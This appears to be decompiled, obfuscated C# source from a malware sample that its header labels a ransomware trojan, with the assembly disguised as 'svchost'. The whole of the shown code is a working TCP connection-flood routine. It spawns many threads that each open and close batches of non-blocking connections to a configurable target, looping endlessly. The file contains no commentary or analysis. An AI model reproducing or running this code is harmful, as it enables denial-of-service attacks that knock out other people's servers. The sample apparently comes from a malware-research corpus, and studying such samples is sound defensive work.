// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u000E
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  private static IPEndPoint \u0008;
  public static int \u0006;
  private static \u000E.\u0002[] \u000E;
  public static int \u000F;
  public static int \u0002\u2000;
  public static bool \u0003\u2000 = false;

  public static void \u0002()
  {
    try
    {
      \u000E.\u0008 = new IPEndPoint(Dns.GetHostEntry(\u000E.\u0005).AddressList[0], \u000E.\u0006);
    }
    catch
    {
      \u000E.\u0008 = new IPEndPoint(IPAddress.Parse(\u000E.\u0005), \u000E.\u0006);
    }
    \u000E.\u0003 = new Thread[\u000E.\u0002\u2000];
    \u000E.\u0002 = new ThreadStart[\u000E.\u0002\u2000];
    \u000E.\u000E = new \u000E.\u0002[\u000E.\u0002\u2000];
    for (int index = 0; index < \u000E.\u0002\u2000; ++index)
    {
      \u000E.\u000E[index] = new \u000E.\u0002(\u000E.\u0008, \u000E.\u000F);
      \u000E.\u0002[index] = new ThreadStart(\u000E.\u000E[index].\u0002);
      \u000E.\u0003[index] = new Thread(\u000E.\u0002[index]);
      \u000E.\u0003[index].Start();
    }
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u000E.\u0002\u2000; ++index)
    {
      try
      {
        \u000E.\u0003[index].Abort();
      }
      catch
      {
      }
    }
  }

  private sealed class \u0002
  {
    private IPEndPoint \u0002;
    private Socket[] \u0003;
    private int \u0005;

    public \u0002(IPEndPoint _param1, int _param2)
    {
      this.\u0002 = _param1;
      this.\u0005 = _param2;
    }

    public void \u0002(IAsyncResult _param1)
    {
    }

    public void \u0002()
    {
      while (true)
      {
        try
        {
          this.\u0003 = new Socket[this.\u0005];
          for (int index = 0; index < this.\u0005; ++index)
          {
            this.\u0003[index] = new Socket(this.\u0002.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.\u0003[index].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.\u0002);
            this.\u0003[index].BeginConnect((EndPoint) this.\u0002, callback, (object) this.\u0003[index]);
          }
          Thread.Sleep(100);
          for (int index = 0; index < this.\u0005; ++index)
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          this.\u0003 = (Socket[]) null;
        }
        catch
        {
          for (int index = 0; index < this.\u0005; ++index)
          {
            try
            {
              if (this.\u0003[index].Connected)
                this.\u0003[index].Disconnect(false);
              this.\u0003[index].Close();
              this.\u0003[index] = (Socket) null;
            }
            catch
            {
            }
          }
        }
      }
    }
  }
}
